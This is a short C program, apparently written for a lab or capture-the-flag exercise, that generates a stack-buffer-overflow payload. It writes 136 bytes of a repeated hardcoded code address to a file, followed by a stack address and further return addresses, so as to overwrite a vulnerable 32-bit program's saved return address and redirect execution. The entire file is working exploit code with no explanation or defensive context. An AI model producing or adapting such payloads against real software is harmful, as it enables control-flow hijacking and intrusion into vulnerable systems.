#include <stdio.h>

int main(int argc, const char * argv[]) {
	FILE * fp = fopen("test.txt", "w");
	void * pointer = /*(void *)0x804851d;// */(void *)0x80484a5;
	void * stack = (void *)0xffffd1dc;
	void * otherPointer = (void *)0x80484a2;
	const char * otherPointerData = (const char *)&otherPointer;
	const char * pointerData = (const char *)&pointer;
	const char * stackData = (const char *)&stack;
	int i;
	for (i = 0; i < 136 / 4; i++) {
		fwrite(pointerData, 4, 1, fp);
	}
	fwrite(stackData, 4, 1, fp);
	fwrite(otherPointerData, 4, 1, fp);
	fwrite(pointerData, 4, 1, fp);
	fprintf(fp, "\n");
	fclose(fp);
	return 0;
}
